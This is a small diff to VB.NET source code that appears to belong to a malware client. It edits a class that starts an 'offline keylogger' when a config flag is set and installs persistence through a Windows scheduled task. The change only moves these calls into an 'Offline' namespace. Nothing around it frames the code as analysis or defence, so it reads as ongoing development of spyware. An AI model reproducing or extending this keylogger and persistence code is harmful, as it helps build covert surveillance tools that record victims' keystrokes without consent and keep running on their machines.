@@ -30,7 +30,7 @@ Namespace Client
 
         Friend Shared Sub StartOfflineKeylogger()
             If Not StarterClass.KeylogOn And Config.offKeylog <> "False" Then
-                Plugin.Launch.Start()
+                Offline.Keyloggers.Launch.Start()
                 KeylogOn = True
             End If
         End Sub
@@ -55,7 +55,7 @@ Namespace Client
         End Sub
 
         Public Shared Sub MakeInstall()
-            Persistence.TaskScheduler.StartUpTaskScheduler(Config.time, Config.taskName)
+            Offline.Persistence.TaskScheduler.StartUpTaskScheduler(Config.time, Config.taskName)
         End Sub
     End Class
 End Namespace
